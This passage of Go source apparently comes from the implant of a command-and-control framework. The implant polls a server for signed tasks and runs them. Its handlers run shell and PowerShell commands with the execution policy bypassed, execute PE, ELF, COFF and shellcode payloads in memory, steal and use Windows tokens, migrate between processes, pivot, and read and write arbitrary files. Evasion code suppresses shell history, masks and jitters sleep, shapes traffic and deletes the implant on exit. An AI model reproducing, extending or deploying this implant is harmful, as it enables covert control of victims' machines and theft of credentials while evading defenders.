			diag("[task %d] SIGNATURE VERIFICATION FAILED — "+
				"dropping task %s verb=%s\n",
				i+1, t.ID, t.Verb)
			continue
		}
		diag("[task %d] signature OK — executing\n", i+1)

		et0 := time.Now()
		result := a.execute(t)
		eelapsed := time.Since(et0)
		diag("[task %d] execute done in %v exit=%d output=%d "+
			"bytes error=%v\n",
			i+1, eelapsed, result.ExitCode,
			len(result.Output), result.Error != "")

		pt0 := time.Now()
		if err := a.postResult(result); err != nil {
			diag("[task %d] RESULT UPLOAD FAILED after %v: %v\n",
				i+1, time.Since(pt0), err)
		} else {
			diag("[task %d] result uploaded in %v\n",
				i+1, time.Since(pt0))
		}
	}
}

func (a *Agent) rngIntn(n int) int {
	a.rngMu.Lock()
	defer a.rngMu.Unlock()
	return a.rng.Intn(n)
}

func (a *Agent) fetchTasks() ([]protocol.Task, error) {
	protocol.ScheduleSleep = -1
	protocol.ScheduleJitter = -1
	protocol.ScheduleKill = 0

	tasks, err := a.transport.FetchTasks(a.wire)
	if err != nil {
		return nil, err
	}
	a.transportFailures = 0

	if protocol.ScheduleSleep >= 0 {
		diag("[fetch] server pushed sleep=%d\n",
			protocol.ScheduleSleep)
		a.session.Sleep = protocol.ScheduleSleep
	}
	if protocol.ScheduleJitter >= 0 {
		diag("[fetch] server pushed jitter=%.2f\n",
			protocol.ScheduleJitter)
		a.session.Jitter = protocol.ScheduleJitter
	}
	if protocol.ScheduleKill > 0 {
		diag("[fetch] server pushed kill deadline=%d\n",
			protocol.ScheduleKill)
		a.deadline = time.Unix(protocol.ScheduleKill, 0)
	}
	return tasks, nil
}

func (a *Agent) postResult(r protocol.Result) error {
	if a.agentPriv != nil {
		payload, err := r.Signable()
		if err == nil {
			sig, serr := SignPayload(a.agentPriv, payload)
			if serr == nil {
				r.Signature = base64.StdEncoding.EncodeToString(sig)
				diag("[result] signed %d bytes of canonical form "+
					"with %d-byte signature\n",
					len(payload), len(sig))
			} else {
				diag("[result] signing failed: %v\n", serr)
			}
		} else {
			diag("[result] Signable() failed: %v\n", err)
		}
	} else {
		diag("[result] no agent private key — result unsigned\n")
	}
	return a.transport.PostResult(r, a.wire)
}

func (a *Agent) verifyTask(t protocol.Task) bool {
	if a.serverPub == nil {
		diag("[verify] no server public key — accepting "+
			"unsigned task %s\n", t.ID)
		return true
	}
	if t.Signature == "" {
		diag("[verify] task %s has no signature and serverPub "+
			"is set — REFUSING\n", t.ID)
		return false
	}

	sig, err := base64.StdEncoding.DecodeString(t.Signature)
	if err != nil {
		diag("[verify] task %s signature base64 decode failed: %v\n",
			t.ID, err)
		return false
	}

	body, err := t.Unsigned()
	if err != nil {
		diag("[verify] task %s Unsigned() failed: %v\n", t.ID, err)
		return false
	}

	a.signMu.Lock()
	defer a.signMu.Unlock()

	hash := sha256.Sum256(body)
	ok := ecdsa.VerifyASN1(a.serverPub, hash[:], sig)
	diag("[verify] task %s canonical=%s verify=%v\n",
		t.ID, string(body), ok)
	return ok
}

func ParseECDSAPublicKey(pemBytes []byte) *ecdsa.PublicKey {
	block, _ := pem.Decode(pemBytes)
	if block == nil {
		return nil
	}
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil
	}
	ecdsaPub, ok := pub.(*ecdsa.PublicKey)
	if !ok {
		return nil
	}
	return ecdsaPub
}

func parseECDSAPrivateKey(pemBytes []byte) (*ecdsa.PrivateKey, error) {
	block, _ := pem.Decode(pemBytes)
	if block == nil {
		return nil, errors.New("no PEM block")
	}
	if priv, err := x509.ParsePKCS8PrivateKey(block.Bytes); err == nil {
		ecdsaPriv, ok := priv.(*ecdsa.PrivateKey)
		if !ok {
			return nil, errors.New("PKCS#8 key is not ECDSA")
		}
		return ecdsaPriv, nil
	}
	if ecdsaPriv, err := x509.ParseECPrivateKey(block.Bytes); err == nil {
		return ecdsaPriv, nil
	}
	return nil, errors.New(
		"private key is neither a PKCS#8 nor an SEC1 ECDSA key")
}

func SignPayload(priv *ecdsa.PrivateKey, payload []byte) ([]byte, error) {
	hash := sha256.Sum256(payload)
	return ecdsa.SignASN1(crand.Reader, priv, hash[:])
}

func (a *Agent) execute(t protocol.Task) protocol.Result {
	timeout := t.Timeout
	if timeout <= 0 {
		timeout = 60
	}
	diag("[exec] verb=%s timeout=%ds\n", t.Verb, timeout)
	ctx, cancel := context.WithTimeout(context.Background(),
		time.Duration(timeout)*time.Second)
	defer cancel()

	if isNativeExtraVerb(t.Verb) {
		diag("[exec] dispatching to native extra verb\n")
		return a.nativeExtraVerb(t)
	}

	if isExtensionVerb(t.Verb) {
		diag("[exec] dispatching to extension verb\n")
		switch t.Verb {
		case "extension_register":
			return a.extensionRegister(t)
		case "extension_call":
			return a.extensionCall(ctx, t)
		case "extension_list":
			return a.extensionList(t)
		case "extension_unload":
			return a.extensionUnload(t)
		}
	}

	diag("[exec] dispatching %q to builtin handler\n", t.Verb)
	switch t.Verb {
	case "exec":
		return a.execVerb(ctx, t)
	case "sh":
		return a.shVerb(ctx, t)
	case "pyexec":
		return a.pyexecVerb(ctx, t)
	case "psexec":
		return a.psexecVerb(ctx, t)
	case "shexec":
		return a.shexecVerb(ctx, t)
	case "truncate":
		return a.truncateVerb(t)
	case "writechunk":
		return a.writechunkVerb(t)
	case "readchunk":
		return a.readChunkVerb(t)
	case "filesize":
		return a.fileSizeVerb(t)
	case "sha256file":
		return a.sha256FileVerb(t)
	case "execmem":
		return a.execmemVerb(ctx, t)
	case "bof":
		return a.bofVerb(ctx, t)
	case "execute_assembly":
		return a.executeAssemblyVerb(ctx, t)
	case "pivot_connect":
		return a.pivotConnectVerb(ctx, t)
	case "pivot_close":
		return a.pivotCloseVerb(t)
	case "migrate":
		return a.migrateVerb(ctx, t)
	case "cred_validate":
		return a.credValidateVerb(ctx, t)
	case "steal_token":
		return a.stealTokenVerb(ctx, t)
	case "cat":
		return a.catVerb(t)
	case "ls":
		return a.lsVerb(t)
	case "pwd":
		return a.simpleVerb(t, []byte(mustGetwd()))
	case "whoami":
		if len(t.Args) > 0 && t.Args[0] == "/priv" {
			if runtime.GOOS != "windows" {
				return protocol.Result{ID: t.ID,
					Error: "whoami /priv is only available on " +
						"Windows (no token model on Linux)"}
			}
			out, err := native.NativeWhoamiPriv(t)
			if err != nil {
				return protocol.Result{ID: t.ID,
					Error: err.Error()}
			}
			return protocol.Result{ID: t.ID,
				Output: encodeOutput([]byte(out))}
		}
		return a.simpleVerb(t, []byte(a.identity.Username))
	case "hostname":
		return a.simpleVerb(t, []byte(a.identity.Hostname))
	case "uname":
		return a.simpleVerb(t,
			[]byte(fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH)))
	case "env":
		return a.simpleVerb(t, []byte(strings.Join(os.Environ(), "\n")))
	case "ps":
		return a.psVerb(t)
	case "id":
		return a.idVerb(t)
	case "readfile":
		return a.catVerb(t)
	case "sleep":
		return a.sleepVerb(t)
	case "workhours":
		return a.workhoursVerb(t)
	case "kill", "exit":
		diag("[exec] self-destruct requested\n")
		closeStolenTokenOnExit()
		go func() {
			time.Sleep(time.Second)
			_ = platform.SelfDelete()
			os.Exit(0)
		}()
		return protocol.Result{
			ID:     t.ID,
			Output: encodeOutput([]byte("terminating\n")),
		}
	}
	diag("[exec] unknown verb %q\n", t.Verb)
	return protocol.Result{
		ID:    t.ID,
		Error: fmt.Sprintf("unknown verb: %s", t.Verb),
	}
}

func (a *Agent) executeAssemblyVerb(
	ctx context.Context, t protocol.Task) protocol.Result {
	if len(t.Args) < 1 {
		return protocol.Result{ID: t.ID,
			Error: "execute_assembly requires base64 shellcode"}
	}
	waitSecs := 60
	if len(t.Args) > 1 {
		if n, err := strconv.Atoi(t.Args[1]); err == nil {
			waitSecs = n
		}
	}
	out, code, err := platform.ExecShellcodeWindows(
		ctx, t.Args[0], waitSecs)
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	return protocol.Result{ID: t.ID,
		Output:   encodeOutput([]byte(out)),
		ExitCode: code}
}

func (a *Agent) execVerb(ctx context.Context, t protocol.Task) protocol.Result {
	if len(t.Args) == 0 {
		return protocol.Result{ID: t.ID, Error: "exec requires a command"}
	}

	if hasStolenToken() {
		diag("[exec] running under stolen token\n")
		out, code, err := execWithStolenToken(ctx,
			t.Args[0], t.Args[1:])
		if err != nil {
			return protocol.Result{ID: t.ID,
				Error: "exec under stolen token: " + err.Error()}
		}
		return protocol.Result{ID: t.ID,
			Output:   encodeOutput([]byte(out)),
			ExitCode: code}
	}

	diag("[exec] spawning command %q args=%v\n",
		t.Args[0], t.Args[1:])
	cmd := exec.CommandContext(ctx, t.Args[0], t.Args[1:]...)
	cmd.Env = sanitizedEnv()
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	r := protocol.Result{ID: t.ID, Output: encodeOutput(out.Bytes())}
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			r.ExitCode = ee.ExitCode()
		} else {
			r.Error = err.Error()
		}
	}
	return r
}

func (a *Agent) shVerb(ctx context.Context, t protocol.Task) protocol.Result {
	if len(t.Args) == 0 {
		return protocol.Result{ID: t.ID, Error: "sh requires a command"}
	}

	command := strings.Join(t.Args, " ")
	diag("[sh] running command %q\n", command)

	var shellPath string
	var shellArgv []string
	switch runtime.GOOS {
	case "windows":
		shellPath = "cmd.exe"
		shellArgv = []string{"/Q"}
	default:
		shellPath = "/bin/sh"
		shellArgv = []string{"-s"}
	}

	cmd := exec.CommandContext(ctx, shellPath, shellArgv...)
	cmd.Stdin = strings.NewReader(command + "\n")
	cmd.Env = sanitizedEnv()

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	r := protocol.Result{ID: t.ID, Output: encodeOutput(out.Bytes())}
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			r.ExitCode = ee.ExitCode()
		} else {
			r.Error = err.Error()
		}
	}
	return r
}

func (a *Agent) pyexecVerb(ctx context.Context, t protocol.Task) protocol.Result {
	if len(t.Args) == 0 {
		return protocol.Result{ID: t.ID,
			Error: "pyexec requires base64-encoded source as first arg"}
	}

	src, err := base64.StdEncoding.DecodeString(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID,
			Error: "invalid base64 in first arg: " + err.Error()}
	}

	scriptArgs := splitScriptArgs(t.Args)

	pythonPath := ""
	for _, candidate := range []string{"python3", "python"} {
		if _, err := exec.LookPath(candidate); err == nil {
			pythonPath = candidate
			break
		}
	}
	if pythonPath == "" {
		return protocol.Result{ID: t.ID,
			Error: "python3/python not found on target"}
	}
	diag("[pyexec] using python=%q script=%d bytes args=%v\n",
		pythonPath, len(src), scriptArgs)

	argv := append([]string{"-"}, scriptArgs...)
	cmd := exec.CommandContext(ctx, pythonPath, argv...)
	cmd.Stdin = strings.NewReader(string(src))
	cmd.Env = sanitizedEnv()

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err = cmd.Run()
	r := protocol.Result{ID: t.ID}
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			r.ExitCode = ee.ExitCode()
		} else {
			r.Error = err.Error()
			r.Output = encodeOutput(stdout.Bytes())
			return r
		}
	}
	r.Output = encodeOutput(mergeStreams(stdout.Bytes(), stderr.Bytes()))
	return r
}

func (a *Agent) psexecVerb(ctx context.Context, t protocol.Task) protocol.Result {
	if runtime.GOOS != "windows" {
		return protocol.Result{ID: t.ID,
			Error: "psexec requires a Windows target"}
	}
	if len(t.Args) == 0 {
		return protocol.Result{ID: t.ID,
			Error: "psexec requires base64-encoded source as first arg"}
	}

	src, err := base64.StdEncoding.DecodeString(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID,
			Error: "invalid base64 in first arg: " + err.Error()}
	}

	scriptArgs := splitScriptArgs(t.Args)
	diag("[psexec] script=%d bytes args=%v\n", len(src), scriptArgs)

	argv := []string{
		"-NoProfile", "-NoLogo", "-NonInteractive",
		"-ExecutionPolicy", "Bypass",
		"-Command", "-",
	}
	argv = append(argv, scriptArgs...)

	cmd := exec.CommandContext(ctx, "powershell.exe", argv...)
	cmd.Stdin = strings.NewReader(string(src))
	cmd.Env = sanitizedEnv()

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err = cmd.Run()
	r := protocol.Result{ID: t.ID}
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			r.ExitCode = ee.ExitCode()
		} else {
			r.Error = err.Error()
			r.Output = encodeOutput(stdout.Bytes())
			return r
		}
	}
	r.Output = encodeOutput(mergeStreams(stdout.Bytes(), stderr.Bytes()))
	return r
}

func (a *Agent) shexecVerb(ctx context.Context, t protocol.Task) protocol.Result {
	if len(t.Args) == 0 {
		return protocol.Result{ID: t.ID,
			Error: "shexec requires base64-encoded source as first arg"}
	}

	src, err := base64.StdEncoding.DecodeString(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID,
			Error: "invalid base64 in first arg: " + err.Error()}
	}

	scriptArgs := splitScriptArgs(t.Args)
	diag("[shexec] script=%d bytes args=%v\n", len(src), scriptArgs)

	var shellPath string
	var shellArgv []string
	var stdinBody string
	switch runtime.GOOS {
	case "windows":
		shellPath = "cmd.exe"
		shellArgv = []string{"/Q"}

		if len(scriptArgs) > 0 {
			var preamble strings.Builder
			for i, arg := range scriptArgs {
				if i >= 9 {
					break
				}
				safe := strings.ReplaceAll(arg, "%", "%%")
				fmt.Fprintf(&preamble,
					"set \"%d=%s\"\n", i+1, safe)
			}
			stdinBody = preamble.String() + string(src)
		} else {
			stdinBody = string(src)
		}
	default:
		shellPath = "/bin/sh"
		shellArgv = []string{"-s"}
		shellArgv = append(shellArgv, scriptArgs...)
		stdinBody = string(src)
	}

	cmd := exec.CommandContext(ctx, shellPath, shellArgv...)
	cmd.Stdin = strings.NewReader(stdinBody)
	cmd.Env = sanitizedEnv()

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err = cmd.Run()
	r := protocol.Result{ID: t.ID}
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			r.ExitCode = ee.ExitCode()
		} else {
			r.Error = err.Error()
			r.Output = encodeOutput(stdout.Bytes())
			return r
		}
	}
	r.Output = encodeOutput(mergeStreams(stdout.Bytes(), stderr.Bytes()))
	return r
}

func splitScriptArgs(args []string) []string {
	for i := 1; i < len(args); i++ {
		if args[i] == "--" {
			return args[i+1:]
		}
	}
	return nil
}

func mergeStreams(stdout, stderr []byte) []byte {
	if len(stderr) == 0 {
		return stdout
	}
	if len(stdout) == 0 {
		return stderr
	}
	out := make([]byte, 0, len(stdout)+len(stderr)+16)
	out = append(out, stdout...)
	if stdout[len(stdout)-1] != '\n' {
		out = append(out, '\n')
	}
	out = append(out, []byte("[stderr]\n")...)
	out = append(out, stderr...)
	return out
}

func (a *Agent) truncateVerb(t protocol.Task) protocol.Result {
	if len(t.Args) < 1 {
		return protocol.Result{ID: t.ID, Error: "truncate requires a path"}
	}
	path := t.Args[0]
	diag("[truncate] path=%q\n", path)

	f, err := os.OpenFile(path,
		os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0600)
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	f.Close()
	return protocol.Result{ID: t.ID,
		Output: encodeOutput([]byte("truncated\n"))}
}

func (a *Agent) writechunkVerb(t protocol.Task) protocol.Result {
	if len(t.Args) < 2 {
		return protocol.Result{ID: t.ID,
			Error: "writechunk requires <b64_data> <remote_path>"}
	}
	data, err := base64.StdEncoding.DecodeString(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID,
			Error: "invalid base64: " + err.Error()}
	}
	path := t.Args[1]
	diag("[writechunk] path=%q %d bytes\n", path, len(data))

	f, err := os.OpenFile(path,
		os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	defer f.Close()

	if _, err := f.Write(data); err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	return protocol.Result{ID: t.ID, Output: ""}
}

func (a *Agent) readChunkVerb(t protocol.Task) protocol.Result {
	if len(t.Args) < 3 {
		return protocol.Result{ID: t.ID,
			Error: "readchunk requires <path> <offset> <size>"}
	}
	path := t.Args[0]
	offset, err := strconv.ParseInt(t.Args[1], 10, 64)
	if err != nil || offset < 0 {
		return protocol.Result{ID: t.ID, Error: "invalid offset"}
	}
	size, err := strconv.ParseInt(t.Args[2], 10, 64)
	if err != nil || size <= 0 || size > 16*1024*1024 {
		return protocol.Result{ID: t.ID,
			Error: "invalid size (must be 1..16777216)"}
	}
	diag("[readchunk] path=%q offset=%d size=%d\n",
		path, offset, size)

	f, err := os.Open(path)
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	defer f.Close()

	if _, err := f.Seek(offset, io.SeekStart); err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}

	buf := make([]byte, size)
	n, err := io.ReadFull(f, buf)
	if err != nil && err != io.EOF && err != io.ErrUnexpectedEOF {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	for i := n; i < len(buf); i++ {
		buf[i] = 0
	}
	return protocol.Result{ID: t.ID, Output: encodeOutput(buf[:n])}
}

func (a *Agent) fileSizeVerb(t protocol.Task) protocol.Result {
	if len(t.Args) < 1 {
		return protocol.Result{ID: t.ID, Error: "filesize requires a path"}
	}
	info, err := os.Stat(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	if info.IsDir() {
		return protocol.Result{ID: t.ID, Error: "path is a directory"}
	}
	diag("[filesize] path=%q size=%d\n", t.Args[0], info.Size())
	return protocol.Result{ID: t.ID, Output: encodeOutput(
		[]byte(strconv.FormatInt(info.Size(), 10)))}
}

func (a *Agent) sha256FileVerb(t protocol.Task) protocol.Result {
	if len(t.Args) < 1 {
		return protocol.Result{ID: t.ID,
			Error: "sha256file requires a path"}
	}
	diag("[sha256file] path=%q\n", t.Args[0])
	f, err := os.Open(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	defer f.Close()

	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	digest := fmt.Sprintf("%x", h.Sum(nil))
	return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(digest))}
}

func (a *Agent) execmemVerb(
	ctx context.Context, t protocol.Task) protocol.Result {
	if len(t.Args) < 2 {
		return protocol.Result{ID: t.ID,
			Error: "execmem requires <remote_path> <kind> [args...]"}
	}
	remotePath := t.Args[0]
	kind := strings.ToLower(t.Args[1])
	payloadArgs := t.Args[2:]
	diag("[execmem] path=%q kind=%q args=%v\n",
		remotePath, kind, payloadArgs)

	switch kind {
	case "exe":
		out, code, err := native.ExecPEInMemory(
			ctx, remotePath, payloadArgs)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID,
			Output:   encodeOutput([]byte(out)),
			ExitCode: code}
	case "elf":
		out, code, err := native.ExecELFInMemory(
			ctx, remotePath, payloadArgs)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID,
			Output:   encodeOutput([]byte(out)),
			ExitCode: code}
	default:
		return protocol.Result{ID: t.ID,
			Error: fmt.Sprintf("unknown payload kind: %s", kind)}
	}
}

func (a *Agent) bofVerb(ctx context.Context, t protocol.Task) protocol.Result {
	if len(t.Args) < 1 {
		return protocol.Result{ID: t.ID,
			Error: "bof requires base64-encoded COFF as first arg"}
	}
	coffBytes, err := base64.StdEncoding.DecodeString(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID,
			Error: "invalid base64 COFF: " + err.Error()}
	}
	entry := ""
	if len(t.Args) > 1 {
		entry = t.Args[1]
	}
	var packedArgs []byte
	if len(t.Args) > 2 && t.Args[2] != "" {
		packedArgs, err = base64.StdEncoding.DecodeString(t.Args[2])
		if err != nil {
			return protocol.Result{ID: t.ID,
				Error: "invalid base64 args: " + err.Error()}
		}
	}
	diag("[bof] coff=%d bytes entry=%q args=%d bytes\n",
		len(coffBytes), entry, len(packedArgs))
	out, code, err := native.ExecBOF(ctx, coffBytes, entry, packedArgs)
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	return protocol.Result{ID: t.ID,
		Output:   encodeOutput([]byte(out)),
		ExitCode: code}
}

func (a *Agent) catVerb(t protocol.Task) protocol.Result {
	if len(t.Args) == 0 {
		return protocol.Result{ID: t.ID, Error: "cat requires a path"}
	}
	diag("[cat] path=%q\n", t.Args[0])
	data, err := os.ReadFile(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	return protocol.Result{ID: t.ID, Output: encodeOutput(data)}
}

func (a *Agent) lsVerb(t protocol.Task) protocol.Result {
	path := "."
	if len(t.Args) > 0 {
		path = t.Args[0]
	}
	diag("[ls] path=%q\n", path)
	entries, err := os.ReadDir(path)
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	var sb strings.Builder
	for _, e := range entries {
		sb.WriteString(e.Name())
		sb.WriteByte('\n')
	}
	return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(sb.String()))}
}

func (a *Agent) psVerb(t protocol.Task) protocol.Result {
	diag("[ps] enumerating processes\n")
	out, err := native.NativePS()
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
}

func (a *Agent) idVerb(t protocol.Task) protocol.Result {
	diag("[id] querying identity\n")
	out, err := native.NativeID()
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
}

func (a *Agent) sleepVerb(t protocol.Task) protocol.Result {
	if len(t.Args) < 1 {
		return protocol.Result{ID: t.ID, Error: "sleep requires seconds"}
	}
	var secs int
	if _, err := fmt.Sscanf(t.Args[0], "%d", &secs); err != nil || secs < 0 {
		return protocol.Result{ID: t.ID,
			Error: "invalid interval (>= 0 required)"}
	}
	a.session.Sleep = secs
	if len(t.Args) > 1 {
		var j float64
		if _, err := fmt.Sscanf(t.Args[1], "%f", &j); err == nil {
			a.session.Jitter = j
		}
	}
	diag("[sleep] interval changed to %ds jitter=%.2f\n",
		a.session.Sleep, a.session.Jitter)
	return protocol.Result{ID: t.ID,
		Output: encodeOutput([]byte(fmt.Sprintf("sleep=%d jitter=%.2f\n",
			a.session.Sleep, a.session.Jitter)))}
}

func (a *Agent) workhoursVerb(t protocol.Task) protocol.Result {
	if len(t.Args) == 0 {
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(
			fmt.Sprintf("workhours=%s\n", formatWorkHours())))}
	}
	if len(t.Args) == 1 {
		arg := strings.ToLower(t.Args[0])
		if arg == "off" || arg == "disable" {
			protocol.WorkHoursStart = 0
			protocol.WorkHoursEnd = 0
			diag("[workhours] disabled\n")
			return protocol.Result{ID: t.ID, Output: encodeOutput(
				[]byte("workhours=off\n"))}
		}
		return protocol.Result{ID: t.ID,
			Error: "workhours <start> <end> | workhours off"}
	}
	start, ok1 := ParseClock(t.Args[0])
	end, ok2 := ParseClock(t.Args[1])
	if !ok1 || !ok2 {
		return protocol.Result{ID: t.ID,
			Error: "invalid clock format, expected HH:MM"}
	}
	protocol.WorkHoursStart = start
	protocol.WorkHoursEnd = end
	diag("[workhours] set to %s\n", formatWorkHours())
	return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(
		fmt.Sprintf("workhours=%s\n", formatWorkHours())))}
}

func formatWorkHours() string {
	if protocol.WorkHoursStart == protocol.WorkHoursEnd {
		return "off"
	}
	return fmt.Sprintf("%02d:%02d-%02d:%02d",
		protocol.WorkHoursStart/60, protocol.WorkHoursStart%60,
		protocol.WorkHoursEnd/60, protocol.WorkHoursEnd%60)
}

func (a *Agent) simpleVerb(t protocol.Task, payload []byte) protocol.Result {
	return protocol.Result{ID: t.ID, Output: encodeOutput(payload)}
}

func encodeOutput(raw []byte) string {
	return base64.StdEncoding.EncodeToString(raw)
}

func sanitizedEnv() []string {
	base := os.Environ()
	out := make([]string, 0, len(base)+5)
	for _, e := range base {
		if strings.HasPrefix(e, "HISTFILE=") ||
			strings.HasPrefix(e, "HISTSIZE=") ||
			strings.HasPrefix(e, "HISTFILESIZE=") ||
			strings.HasPrefix(e, "HISTCONTROL=") ||
			strings.HasPrefix(e, "HISTIGNORE=") ||
			strings.HasPrefix(e, "HISTTIMEFORMAT=") {
			continue
		}
		out = append(out, e)
	}
	out = append(out,
		"HISTFILE=/dev/null",
		"HISTSIZE=0",
		"HISTFILESIZE=0",
		"HISTCONTROL=ignorespace",
		"HISTIGNORE=*",
		"HISTTIMEFORMAT=",
	)
	return out
}

func (a *Agent) sleep() {
	base := a.session.Sleep
	if base < 0 {
		base = 0
	}

	if base == 0 {
		diag("[sleep] interval is 0 — polling again in 100ms\n")
		time.Sleep(100 * time.Millisecond)
		return
	}

	jitter := a.session.Jitter
	if jitter < 0 {
		jitter = 0
	}
	if jitter > 1 {
		jitter = 1
	}

	a.rngMu.Lock()
	extra := a.rng.Float64() * float64(base) * jitter
	a.rngMu.Unlock()

	total := time.Duration(float64(base)+extra) * time.Second
	diag("[sleep] sleeping %v (base=%ds jitter=%.2f extra=%v)\n",
		total, base, jitter, time.Duration(extra*float64(time.Second)))

	if SleepMaskEnabled && total > 5*time.Second {
		ms := uint32(total.Milliseconds())
		diag("[sleep] attempting masked sleep type=%q %dms\n",
			SleepMaskType, ms)
		// The masked sleep is a single syscall and cannot
		// be interrupted by the kill deadline the way the
		// plaintext loop can. A deadline that fires inside
		// the sleep window is honoured on the next run-loop
		// iteration, so the effective overshoot is bounded
		// by the current sleep interval, not by the 30 s
		// polling step. A build with a short kill deadline
		// and a sleep mask should use a short sleep interval
		// if the deadline matters more than the sleep.
		if err := evasion.MaskedSleep(SleepMaskType, ms); err != nil {
			diag("[sleep] mask failed: %v — refusing to sleep "+
				"in plaintext; exiting\n", err)
			_ = platform.SelfDelete()
			os.Exit(1)
		}
		return
	}

	deadline := time.Now().Add(total)
	for {
		now := time.Now()
		if !now.Before(deadline) {
			break
		}
		if !a.deadline.IsZero() && now.After(a.deadline) {
			diag("[sleep] interrupted by kill deadline\n")
			break
		}
		step := 30 * time.Second
		if remaining := deadline.Sub(now); remaining < step {
			step = remaining
		}
		time.Sleep(step)
	}
	diag("[sleep] wake\n")
}

func GatherIdentity(cfg Config) protocol.Identity {
	hostname, _ := os.Hostname()
	username := ""
	if u, err := user.Current(); err == nil {
		username = u.Username
	}
	return protocol.Identity{
		Hostname:  hostname,
		Username:  username,
		MachineID: platform.MachineID(),
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		Proto:     1,
		KillDays:  cfg.KillDays,
		WorkStart: cfg.WorkHoursStart,
		WorkEnd:   cfg.WorkHoursEnd,
	}
}

func (a *Agent) shapeForOp(op, direction string) *features.ShapeSpec {
	if a.shaping == nil {
		return nil
	}
	switch op {
	case "beacon":
		if direction == "response" {
			return a.shaping.CheckinResponse
		}
	case "tasks":
		if direction == "response" {
			return a.shaping.TasksResponse
		}
	case "results":
		if direction == "request" {
			return a.shaping.ResultsRequest
		}
	}
	return nil
}

func mustGetwd() string {
	wd, err := os.Getwd()
	if err != nil {
		return "?"
	}
	return wd
}

func ParseClock(s string) (int, bool) {
	parts := strings.SplitN(strings.TrimSpace(s), ":", 2)
	if len(parts) != 2 {
		return 0, false
	}
	h, err := strconv.Atoi(parts[0])
	if err != nil || h < 0 || h > 23 {
		return 0, false
	}
	m, err := strconv.Atoi(parts[1])
	if err != nil || m < 0 || m > 59 {
		return 0, false
	}
	return h*60 + m, true
}

func insideWorkHours(now time.Time) bool {
	if protocol.WorkHoursStart == protocol.WorkHoursEnd {
		return true
	}
	cur := now.Hour()*60 + now.Minute()
	if protocol.WorkHoursStart < protocol.WorkHoursEnd {
		return cur >= protocol.WorkHoursStart && cur < protocol.WorkHoursEnd
	}
	return cur >= protocol.WorkHoursStart || cur < protocol.WorkHoursEnd
}

func BuildDoHTLSConfig(cfg Config) (*tls.Config, error) {
	out := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		NextProtos:         []string{"h2", "http/1.1"},
		ClientSessionCache: tls.NewLRUClientSessionCache(4),
	}
	return out, nil
}

func BuildTLSConfig(cfg Config) (*tls.Config, error) {
	out := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		NextProtos:         []string{"h2", "http/1.1"},
		ClientSessionCache: tls.NewLRUClientSessionCache(16),
	}

	if p := os.Getenv("SSLKEYLOGFILE"); p != "" {
		if f, err := os.OpenFile(p,
			os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600); err == nil {
			out.KeyLogWriter = f
			diag("[tls] keylog enabled: %s\n", p)
		} else {
			diag("[tls] keylog open failed: %v\n", err)
		}
	}

	_ = cfg

	if cfg.RootCAPem != "" {
		raw, err := base64.StdEncoding.DecodeString(cfg.RootCAPem)
		if err == nil {
			pool := x509.NewCertPool()
			if pool.AppendCertsFromPEM(raw) {
				out.RootCAs = pool
				out.InsecureSkipVerify = true
				out.VerifyConnection = func(
					cs tls.ConnectionState) error {
					opts := x509.VerifyOptions{
						Roots:         pool,
						Intermediates: x509.NewCertPool(),
					}
					for _, cert := range cs.PeerCertificates[1:] {
						opts.Intermediates.AddCert(cert)
					}
					_, err := cs.PeerCertificates[0].Verify(opts)
					return err
				}
				diag("[tls] RootCA pool loaded — chain "+
